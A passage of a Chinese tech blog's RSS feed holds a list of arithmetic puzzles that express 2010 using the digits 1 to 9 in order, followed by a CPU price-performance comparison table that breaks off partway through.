2010 = (1*2/.3)*(4+5*(6+.7-.8))*9<br>
2010 = ((1-2*34)/.5)*(6/(7-8)-9)<br>
2010 = ((.1/2+3/.4+5)/.6+7)*8*9<br>
2010 = ((1+2-.3)/.4)*.5*67*8/.9<br>
2010 = ((1+2-.3)/.4)*5*67*.8/.9<br>
2010 = 1+((2/.3+.4)*5*6-7)*(.8+9)<br>
2010 = (1/.2)*((34/.5)*6-7.8)+9<br>
2010 = (1+(2+.3)/.4)*.5*67*8/.9<br>
2010 = (1+(2+.3)/.4)*5*67*.8/.9<br>
2010 = (1+2+(.3/.4)*.5)*67*8/.9<br>
2010 = (1/(.2-.3+.4))*(5+6+7*8)*9<br>
2010 = ((1+.2/.3+4)*5*(.6+7)+8)*9<br>
2010 = 1-(2*3*(4-.5)/.6)*7*(.8-9)<br>
2010 = ((1-2)/.3)*(4+5)*67/(8-9)<br>
2010 = (1/.2)*3*4*5*(6-7*(.8-.9))<br>
2010 = ((.1+(2+3)*4)/.5)*(67-8-9)<br>
2010 = ((12/.3)*(45+.6)-7-8)/.9<br>
2010 = (12/.3-4)*(56-(.7+.8)/9)<br>
2010 = ((1-2*34)/(.5+(6-7)*.8))*9<br>
2010 = ((1+23)/.4)*((.5-6)*7+8*9)<br>
2010 = .1*.2+(3+4)*(5*6-.7)*(.8+9)<br>
2010 = ((1-2+3)/.4)*(5*(.6+78)+9)<br>
2010 = (1+(23/(.4+5))*6*(.7+8))*9<br>
2010 = .1+(2/.3)*45*(6+.7)+.8-.9<br>
2010 = .1+(2/.3)*(4+.5)*67+.8-.9<br>
2010 = ((1+2)/(.3*4+.5))*67*(8+9)<br>
2010 = ((1+2)/(3*.4+.5))*67*(8+9)<br>
2010 = (12/(3+.4))*5*(6+.7)*(8+9)<br>
2010 = ((12/.3)*45+.6*(7+8))/.9<br>
2010 = (1-(2+.3)*(4-56))*(7+8)/.9<br>
2010 = ((1+23)/.4)*5*(6-.7*(8-9))<br>
2010 = (1/.2)*((34/.5)*6-7-.8)+9<br>
2010 = ((12+3)/.4)*(56-.7-.8-.9)<br>
2010 = 1-((.2-3)/.4)*((5*6+7)*8-9)<br>
2010 = (12*3/.4)*(5+(.6+7+8)/.9)<br>
2010 = ((1+2)/.3)*(4+5*(6*7-.8)-9)<br>
2010 = (1+(2/.3+4*5)*(67+.8))/.9<br>
2010 = 1-((.2-3)/.4)*(5+6*(7*8-9))<br>
2010 = (1*2/.3)*4*((.5+67)/.8-9)<br>
2010 = 1+((.2-3)/.4)*((5-6*7)*8+9)<br>
2010 = (12/.3)*((.4+5+6*7)/.8-9)<br>
2010 = ((12+3)*4/.5+.6)*(7+8)/.9<br>
2010 = (1+(2-(3+4)*5*(.6-7))*8)/.9<br>
2010 = 1+(2+3)*((4/.5)*6-7)*(.8+9)<br>
2010 = (12/3)*((.4-.5)/.6+7*8)*9<br>
2010 = ((1/2)/(.3+.4+.5))*67*8*9<br>
2010 = (1-23*(.4/.5-6))*(7+8)/.9<br>
2010 = (1/.2)*(3+(4-.5)*(6*7+8*9))<br>
2010 = ((.1/.2-34)/.5)*(6*7-8*9)<br>
2010 = ((1-2)*3/.4)*(5*(.6-7*8)+9)<br>
2010 = (1/.2)*(3+4*(.5+6)*(7+8)+9)<br>
2010 = (1+(2/.3)*4*(.5+67)+8)/.9<br>
2010 = (.1-2)*(34-.5)*6/(.7-.89)<br>
2010 = (1+(2/.3)*(4+5*67)*.8)/.9<br>
2010 = (12/.34)*5*(6+.7)*(.8+.9)<br>
2010 = ((1+.2)/.34)*5*67*(.8+.9)<br>
2010 = (((1+2)/3.4)/.5)*67*(8+9)<br>
2010 = 1-(.2+(3+.4)*(5+67))*(.8-9)<br>
2010 = 1*(((23/.4)*5-.6)*7+.8+.9)<br>
2010 = 1*(((23/.4)*5-.6)*7+.8)+.9<br>
2010 = ((1/.2+3)/.4)*5*(6+7+8-.9)<br>
2010 = ((1.2+.3)/.4)*(5+(67-8)*9)<br>
2010 = (1/(.2+.3)-4*(.5/6-7)*8)*9<br>
2010 = (1/(.2+.3)-45*6)*(.7+.8-9)<br>
2010 = (1*2/.3)*(.4+.5*(67-.8))*9<br>
2010 = (1-((.2-3/.4)*5*6-7)*8)/.9<br>
2010 = (1-(.2/.3-4)*(.5+67-.8))*9<br>
2010 = (1/.2+(3/.4)*5*6)*(.7+8)+9<br>
2010 = (.1*2-(3+.4)*(.5-67)*8)/.9<br>
2010 = (1*.2-(3+.4)*(.5-67)*8)/.9<br>
2010 = 1*(.2-(3+.4)*(.5-67)*8)/.9<br>
2010 = 1-((2/.3)*4+5/.6)*7*(.8-9)<br>
2010 = 1-(.2-3*(4+5)*(.6+7))*(.8+9)<br>
2010 = ((12+3)/.4)*(.5+(67-8)*.9)<br>
2010 = (1/(.2/3-.4))*(5-(67+8)*9)<br>
2010 = ((1-2)/.3)*(.4/.5-67.8)*9<br>
2010 = (1+2)*(3+(4/.5)*(67+8))/.9<br>
2010 = ((1-2*34)/(.5+(.6-7)/8))*9<br>
2010 = (1+2*(3+4))*((5/.6)*(7+8)+9)<br>
2010 = ((1+2)/.3)*((4*5-6)*(7+8)-9)<br>
2010 = .1+((2/.3)*4*5+.6)*(7+8)+.9<br>
2010 = .1+((2*3/.4)/.5)*67+.8-.9<br>
2010 = ((12/.3)*(.4+5)*67/.8)/9<br>
2010 = ((12/.3)*(.4+5)*67/8)/.9<br>
2010 = (((1-2*34)/.5)/.6)*(7-8)*9<br>
2010 = ((1+23)/.4)*5*(6-.7/(8-9))<br>
2010 = ((1*2/.3)/.4)*(5.6+7+.8)*9<br>
2010 = ((.1+.2)/.3-4)*(5-(67+8)*9)<br>
2010 = ((1+.2+.3)/.4)*(5+(67-8)*9)<br>
2010 = (1*2*3/.4)*((5/.6)*(7+8)+9)<br>
2010 = (((1/.2)/3+4)*5*(.6+7)+8)*9<br>
2010 = (((1/2)/.3+4)*5*(.6+7)+8)*9<br>
2010 = ((1+.2)/.3)*((4-5)/6+7*8)*9<br>
2010 = 1-(((2-.3)/.4)*56+7)*(.8-9)<br>
2010 = (1/.2)*3*((4+5)/.6+7*(8+9))<br>
2010 = (1/.2)*((3+.4*5)*(.6+78)+9)<br>
2010 = (1/.2)*((3+4*.5)*(.6+78)+9)<br>
2010 = (1+(2/.3)*(.4+5*6.7)*8)/.9<br>
2010 = ((1+.2)/.34)*5*(6+.7)*(8+9)<br>
2010 = ((12/.3)*45+6*(.7+.8))/.9<br>
2010 = ((1+23)/.4)*5*(6-7*(.8-.9))<br>
2010 = ((12/.3)/.4)*(5+6-.7+.8+9)<br>
2010 = ((1-2)/.3)*(.4/.5-67-.8)*9<br>
2010 = (((.1-.2)/3)/.4+.5)*67*8*9<br>
2010 = (((1-(23+4)*5)/.6)/(7-8))*9<br>
2010 = 1-(2+(3/.4)*(5-.6))*7*(.8-9)<br>
2010 = ((1-.2/3+4/.5)/.6)*(7+8)*9<br>
2010 = (1+(2/.3)*(.4+.5*67)*8)/.9<br>
2010 = (((1+2)/.34)/.5)*6.7*(8+9)<br>
2010 = ((1*2/.3)/.4)*(5+.6+7+.8)*9<br>
2010 = ((12+3)/.4)*(.5+(6.7-.8)*9)<br>
2010 = ((.1-2/.3)*4-5)*(.6/.7-8)*9<br>
2010 = ((1+2-.3)/.4)*5*(6+.7)*8/.9<br>
2010 = (1+(2+.3)/.4)*5*(6+.7)*8/.9<br>
2010 = (.1/(.2-.3)+4*(.5/6+7*8))*9<br>
2010 = ((.1/.2)*3/.4)*(5+(67-8)*9)<br>
2010 = ((1/.2)*.3/.4)*(5+(67-8)*9)<br>
2010 = (12/.3)*((4*(.5+6)+7)/.8+9)<br>
2010 = (1+((2/.3)/.4)*5/6)*(7+8)*9<br>
2010 = ((1/.2-3)/.4)*(5*(.6+78)+9)<br>
2010 = (((1-2)/.3)*(.4-5*(6+7))+8)*9<br>
2010 = ((12+3)/.4)*(.5+(6+.7-.8)*9)<br>
2010 = (12/.3)*((.4+56)*.7/.8+.9)<br>
2010 = (1.2/.3)*((.4-.5)/.6+7*8)*9<br>
2010 = (((.1-2)/.3)*(4/.5-6*7)+8)*9<br>
2010 = ((12+3)/.4)*(.5+6*(.7+8)+.9)<br>
2010 = ((.1+.2)/.3+4)*(5*(.6+78)+9)<br>
2010 = ((1/.2)*3/.4)*(56-.7-.8-.9)<br>
2010 = ((1/.2)/.3)*(45+(.6+7.8)*9)<br>
2010 = ((12/(.3-.4))/(5/.67-8))*9<br>
2010 = ((1/.2)*3*4/.5+.6)*(7+8)/.9<br>
2010 = ((.1/.2)/(.3+.4+.5))*67*8*9<br>
2010 = ((1/.2)/(.3+.4+.5))*67*.8*9<br>
2010 = 1-(2/.3)*(.4-(.5+6*7)*(8-.9))<br>
2010 = (((1+2)/(3+.4))/.5)*67*(8+9)<br>
2010 = ((1+2+3)/.4)*((5/.6)*(7+8)+9)<br>
2010 = ((1+2)/.3)*((4/.5+6)*(7+8)-9)<br>
2010 = ((1+((2/.3)/.4)/.56)*7+8)*9<br>
2010 = (((1+2)/.34)/.5)*67*(.8+.9)<br>
2010 = ((((1+2)/.3)/.4)*5/.6+7+8)*9<br>
2010 = ((1/.2)*3/.4)*(.5+(67-8)*.9)<br>
2010 = ((1/.2)/(.3-.4))*(5*6-78*.9)<br>
2010 = ((.1+2)/.3)*(4-(.5/6)/7)*8*9<br>
2010 = (((1/.2)/.3)*4/.5+6*(7+8))*9<br>
2010 = (((.1-2)/.3)*(4-5*(.6+7))+8)*9<br>
2010 = (((.1/.2)/.3+4)*5*(.6+7)+8)*9<br>
2010 = ((((1-2*34)/.5)/.6)/(7-8))*9<br>
2010 = (1+(2/.3)*(.4+5*(6+.7))*8)/.9<br>
2010 = (((1+2)/.34)/.5)*(6+.7)*(8+9)<br>
2010 = ((1/.2)*3/.4)*(.5+(6.7-.8)*9)<br>
2010 = (((1+23)/.4)/.5+.6)*(7+8)/.9<br>
2010 = ((1/.2+3)/.4)*(.5+6*(7+8)/.9)<br>
2010 = ((1/.2)/.3+(4*5/.6)*(7-.8))*9<br>
2010 = (((1+2/.3)/.4)/.5)*6*(.7+8)+9<br>
2010 = ((1/.2)/.3)*(.4+.5+(6-.7+8)*9)<br>
2010 = ((1/.2)*3/.4)*(.5+(6+.7-.8)*9)<br>
2010 = ((1+.2)/.3)*((.4-.5)/.6+7*8)*9<br>
2010 = ((1/.2)*3/.4)*(.5+6*(.7+8)+.9)<br>
2010 = ((1/(.2+.3))/.4)*(5*(.6+78)+9)<br>
2010 = ((1/.2)/.3)*((4+5)*(6-.7+8)+.9)<br>
2010 = ((1/(.2-.3))/(.4-.5))*(6+7+8-.9)</p>
<p>文章：<a href="http://www.thesamet.com/2010.txt" target="_blank">来源</a></p>
 ]]></content>
<pubDate>2010-01-07T08:22:13+08:00</pubDate>
<guid>https://coolshell.cn/articles/2036.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ CPU的性价比 ]]></title>
<link>https://coolshell.cn/articles/2039.html</link>
<content><![CDATA[ 
<p>下面这个网站是关于CPU的性价比的，其中的性能数据来源于<a href="https://www.cpubenchmark.net/cpu_list.php">cpubenchmark.net</a>，而价格数据来源于：<a href="https://www.newegg.com/Store/Category.aspx?Category=34">newegg.com</a>。</p>
<p style="text-align: center;"><a href="http://paulisageek.com/compare/cpu/" target="_blank">http://paulisageek.com/compare/cpu/</a></p>
<p style="text-align: left;">于是，得出了目前性价比最差的是：Intel Xeon X5570 @ 2.93GHz，最好的是：AMD Phenom 9850 Quad-Core，下面是一个性价比表格。</p>
<p style="text-align: left;"><span id="more-2039"></span></p>
<p></p>
<center>
<table border="0">
<thead>
<tr>
<th id="yui-dt0-th-Name">CPU类型</th>
<th id="yui-dt0-th-Performance">性能</th>
<th id="yui-dt0-th-Price">价值</th>
<th id="yui-dt0-th-PerformancePrice">性价比</th>
</tr>
</thead>
<tbody></tbody>
<tbody>
<tr id="yui-rec20">
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103280">AMD Phenom 9850 Quad-Core</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+9850+Quad-Core">2864</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103280">89.99</a></td>
<td>31.8</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103706">AMD Athlon II X4 620</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Athlon+II+X4+620">3084</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103706">99.00</a></td>
<td>31.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103726">AMD Athlon II X3 425</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Athlon+II+X3+425">2366</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103726">76.00</a></td>
<td>31.1</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103772">AMD Athlon 64 X2 Dual Core 6000+</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Athlon+64+X2+Dual+Core+6000%2B">1577</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103772">53.99</a></td>
<td>29.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103704">AMD Athlon II X4 630</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Athlon+II+X4+630">3282</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103704">112.99</a></td>
<td>29.1</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103279">AMD Athlon 64 X2 Dual Core 5600+</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Athlon+64+X2+Dual+Core+5600%2B">1473</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103279">50.99</a></td>
<td>28.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116265">Intel Celeron E3200 @ 2.40GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Celeron+E3200+%40+2.40GHz">1515</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116265">52.99</a></td>
<td>28.6</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103724">AMD Athlon II X3 435</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Athlon+II+X3+435">2416</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103724">87.00</a></td>
<td>27.8</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103295">AMD Phenom 8750 Triple-Core</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+8750+Triple-Core">2000</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103295">72.99</a></td>
<td>27.4</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103688">AMD Athlon II X2 240</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Athlon+II+X2+240">1603</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103688">58.99</a></td>
<td>27.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103687">AMD Athlon II X2 245</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Athlon+II+X2+245">1679</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103687">62.00</a></td>
<td>27.1</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116264">Intel Celeron E3300 @ 2.50GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Celeron+E3300+%40+2.50GHz">1668</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116264">62.99</a></td>
<td>26.5</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103698">AMD Sempron 140</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Sempron+140">913</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103698">35.99</a></td>
<td>25.4</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116072">Pentium Dual-Core E5200 @ 2.50GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Pentium+Dual-Core+E5200+%40+2.50GHz">1631</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116072">64.50</a></td>
<td>25.3</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103681">AMD Athlon II X2 250</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Athlon+II+X2+250">1663</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103681">67.00</a></td>
<td>24.8</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116074">Pentium Dual-Core E5300 @ 2.60GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Pentium+Dual-Core+E5300+%40+2.60GHz">1706</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116074">69.99</a></td>
<td>24.4</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116075">Intel Celeron E1500 @ 2.20GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Celeron+E1500+%40+2.20GHz">1216</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116075">49.99</a></td>
<td>24.3</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103656">AMD Phenom II X4 925</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+II+X4+925">3377</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103656">140.99</a></td>
<td>24</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103287">AMD Phenom 9150e Quad-Core</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+9150e+Quad-Core">2148</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103287">89.99</a></td>
<td>23.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116091">Pentium Dual-Core E6300 @ 2.80GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Pentium+Dual-Core+E6300+%40+2.80GHz">1859</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116091">80.99</a></td>
<td>23</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103813">AMD Phenom 9750 Quad-Core</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+9750+Quad-Core">2727</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103813">119.00</a></td>
<td>22.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115207">Intel Core2 Quad Q8300 @ 2.50GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Quad+Q8300+%40+2.50GHz">3554</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115207">159.99</a></td>
<td>22.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115055">Intel Core2 Quad Q8200 @ 2.33GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Quad+Q8200+%40+2.33GHz">3221</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115055">148.99</a></td>
<td>21.6</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103650">AMD Phenom II X4 810</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+II+X4+810">3019</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103650">139.99</a></td>
<td>21.6</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103288">AMD Phenom 9650 Quad-Core</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+9650+Quad-Core">2595</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103288">119.99</a></td>
<td>21.6</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116093">Pentium Dual-Core E6500 @ 2.93GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Pentium+Dual-Core+E6500+%40+2.93GHz">2042</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116093">94.99</a></td>
<td>21.5</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115215">Intel Core i5 750 @ 2.67GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core+i5+750+%40+2.67GHz">4186</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115215">194.99</a></td>
<td>21.5</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115037">Intel Core2 Quad Q8400 @ 2.66GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Quad+Q8400+%40+2.66GHz">3602</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115037">167.99</a></td>
<td>21.4</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103692">AMD Phenom II X4 965</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+II+X4+965">4200</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103692">195.99</a></td>
<td>21.4</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103808">AMD Phenom II X4 955</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+II+X4+955">3770</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103808">175.99</a></td>
<td>21.4</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103644">AMD Phenom II X4 940</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+II+X4+940">3558</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103644">166.97</a></td>
<td>21.3</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819105259">Dual-Core AMD Opteron 1216</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Dual-Core+AMD+Opteron+1216">1169</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819105259">55.99</a></td>
<td>20.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103293">AMD Phenom 9350e Quad-Core</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+9350e+Quad-Core">2296</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103293">109.99</a></td>
<td>20.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103716">AMD Athlon 5000 Dual-Core</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Athlon+5000+Dual-Core">1376</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103716">65.99</a></td>
<td>20.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103675">AMD Phenom II X4 945</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+II+X4+945">3403</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103675">165.00</a></td>
<td>20.6</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103709">AMD Phenom 8250e Triple-Core</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+8250e+Triple-Core">1531</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103709">75.99</a></td>
<td>20.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103269">AMD Phenom 8600B Triple-Core</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+8600B+Triple-Core">1864</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103269">92.99</a></td>
<td>20.1</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115214">Intel Core i7 860 @ 2.80GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core+i7+860+%40+2.80GHz">5565</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115214">279.99</a></td>
<td>19.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116076">Pentium Dual-Core E5400 @ 2.70GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Pentium+Dual-Core+E5400+%40+2.70GHz">1754</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116076">89.99</a></td>
<td>19.5</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115131">Intel Core2 Quad Q9400 @ 2.66GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Quad+Q9400+%40+2.66GHz">3678</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115131">189.99</a></td>
<td>19.4</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115202">Intel Core i7 920 @ 2.67GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core+i7+920+%40+2.67GHz">5452</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115202">288.99</a></td>
<td>18.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103210">AMD Athlon 64 X2 Dual Core 5200+</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Athlon+64+X2+Dual+Core+5200%2B">1374</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103210">73.99</a></td>
<td>18.6</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103648">AMD Phenom II X3 710</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+II+X3+710">2201</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103648">119.00</a></td>
<td>18.5</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103680">AMD Phenom II X2 550</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+II+X2+550">1834</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103680">99.00</a></td>
<td>18.5</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103694">AMD Phenom II X2 545</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+II+X2+545">1722</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103694">93.98</a></td>
<td>18.3</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103649">AMD Phenom II X3 720</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+II+X3+720">2525</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103649">140.99</a></td>
<td>17.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103769">AMD Athlon 64 X2 Dual Core 5400+</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Athlon+64+X2+Dual+Core+5400%2B">1443</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103769">81.99</a></td>
<td>17.6</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103189">AMD Sempron LE-1250</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Sempron+LE-1250">550</a></td>
